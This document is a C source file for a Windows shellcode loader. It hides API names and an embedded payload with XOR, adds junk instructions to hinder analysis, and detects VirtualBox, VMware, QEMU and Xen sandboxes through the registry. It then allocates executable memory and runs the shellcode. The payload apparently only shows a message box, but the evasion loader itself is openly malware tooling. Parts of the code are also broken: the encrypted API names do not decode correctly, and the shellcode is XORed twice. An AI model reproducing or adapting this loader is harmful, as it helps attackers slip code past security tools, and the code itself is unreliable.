#include <stdio.h>
#include <windows.h>
#include "functions.h"

// Define XOR key parts for encryption/decryption
#define XOR_KEY_PART1 0xA5
#define XOR_KEY_PART2 0x0F

// Encrypted keys and function names
unsigned char key_part1[] = {XOR_KEY_PART1, 0x00, 0x00, 0x00};
unsigned char key_part2[] = {XOR_KEY_PART2, 0x00, 0x00, 0x00};

unsigned char encVirtualAlloc[] = {0xD2, 0x82, 0x91, 0x80, 0x9C, 0x91, 0x9C, 0x8C, 0x89, 0x80, 0x8A, 0x91, 0x83, 0x00};
unsigned char encRtlMoveMemory[] = {0xD2, 0x89, 0x93, 0x80, 0x9E, 0x8A, 0x83, 0xD2, 0x82, 0x91, 0x80, 0x9C, 0x91, 0x9C, 0x8C, 0x89, 0x80, 0x8A, 0x91, 0x83, 0x00};

// Calculate the XOR key
unsigned char calculate_xor_key() {
    return key_part1[0] ^ key_part2[0];
}

// XOR decryption function
void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
        if (i % 2 == 0) __asm__("nop");  // Insert junk instruction to obfuscate analysis
    }
}

// Decrypt a string using XOR
void decrypt_xor_string(unsigned char *str, unsigned char key) {
    while (*str) {
        *str ^= key;
        str++;
        if (rand() % 4 == 0) __asm__("nop");
    }
}

// Check for common sandbox/virtualization environments
int detect_sandbox() {
    char *sandbox_env[] = { "VIRTUALBOX", "VMWARE", "QEMU", "XEN" };
    HKEY hKey;
    char buffer[1024];
    DWORD bufferSize = sizeof(buffer);
    
    for (int i = 0; i < sizeof(sandbox_env) / sizeof(sandbox_env[0]); i++) {
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueEx(hKey, "0", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                if (strstr(buffer, sandbox_env[i])) {
                    RegCloseKey(hKey);
                    return 1;  // Sandbox detected
                }
            }
            RegCloseKey(hKey);
        }
    }
    return 0;  // No sandbox detected
}

unsigned char* load_shellcode(size_t *len) {
    unsigned char shellcode[] = {0x56, 0xe2, 0x2b, 0x4e, 0x5a, 0x55, 0x55, 0x55, 0x42, 0x7a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0x94, 0xe2, 0x21, 0xf8, 0xb2, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0xe2, 0x21, 0xd8, 0xfa, 0x94, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x94, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xc5, 0xe2, 0xab, 0x7a, 0xfa, 0x94, 0x21, 0xe2, 0xb2, 0x94, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xf6, 0xe2, 0x55, 0x63, 0x94, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0x94, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x7c, 0xf2, 0x94, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0x94, 0xeb, 0x21, 0xa6, 0xe2, 0x94, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0x94, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0x94, 0xe2, 0x21, 0xb8, 0x43, 0xe3, 0x55, 0x55, 0x55, 0xf7, 0x94, 0xe2, 0x27, 0x27, 0x8b, 0xab, 0xaa, 0xaa, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe3, 0x6d, 0x6b, 0xaa, 0xaa, 0xaa, 0xaa, 0x94, 0xe2, 0x27, 0x3f, 0xa4, 0xab, 0xaa, 0xaa, 0x94, 0xe6, 0x27, 0x2f, 0xb1, 0xab, 0xaa, 0xaa, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0xef, 0x29, 0xfc, 0xad, 0x55, 0x7f, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f, 0xe2, 0xcf, 0xc6, 0xc6, 0xc5, 0x86, 0x8a, 0xdd, 0xc5, 0xd8, 0xc6, 0xce, 0xaa, 0xe2, 0xcf, 0xc6, 0xc6, 0xc5, 0xaa, 0xdf, 0xd9, 0xcf, 0xd8, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0xaa, 0xaa};
    *len = sizeof(shellcode);

    unsigned char *allocated_shellcode = (unsigned char*)malloc(*len);
    if (!allocated_shellcode) return NULL;

    memcpy(allocated_shellcode, shellcode, *len);

    return allocated_shellcode;
}

// Execute the decrypted shellcode
int execute_shellcode() {
    unsigned char xor_key = calculate_xor_key();

    // Decrypt the encrypted API strings
    decrypt_xor_string(encVirtualAlloc, xor_key);
    decrypt_xor_string(encRtlMoveMemory, xor_key);

    // Resolve function addresses dynamically
    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
    HMODULE hNtdll = LoadLibrary("ntdll.dll");

    void* (*pVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = (void* (*)(void*, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, (char*)encVirtualAlloc);
    void (*pRtlMoveMemory)(void*, const void*, SIZE_T) = (void (*)(void*, const void*, SIZE_T))GetProcAddress(hNtdll, (char*)encRtlMoveMemory);

    if (!pVirtualAlloc || !pRtlMoveMemory) {
        return 1;
    }

    // Anti-sandbox check
    if (detect_sandbox()) {
        return 1;
    }

    // Load and decrypt shellcode
    size_t shellcode_len;
    unsigned char *shellcode = load_shellcode(&shellcode_len);
    if (!shellcode) {
        return 1;
    }

    xor_decrypt(shellcode, shellcode_len, xor_key);

    // Allocate memory and move shellcode
    void *exec = pVirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        free(shellcode);
        return 1;
    }

    pRtlMoveMemory(exec, shellcode, shellcode_len);
    free(shellcode);

    // Self-modifying code: modify the shellcode before execution
    unsigned char *modifier = (unsigned char *)exec;
    for (size_t i = 0; i < shellcode_len; i++) {
        modifier[i] ^= xor_key;
        if (rand() % 2 == 0) __asm__("nop");  // Junk instruction to obfuscate analysis
    }

    // Execute the shellcode
    void (*func)() = (void (*)())exec;

    func();

    return 0;
}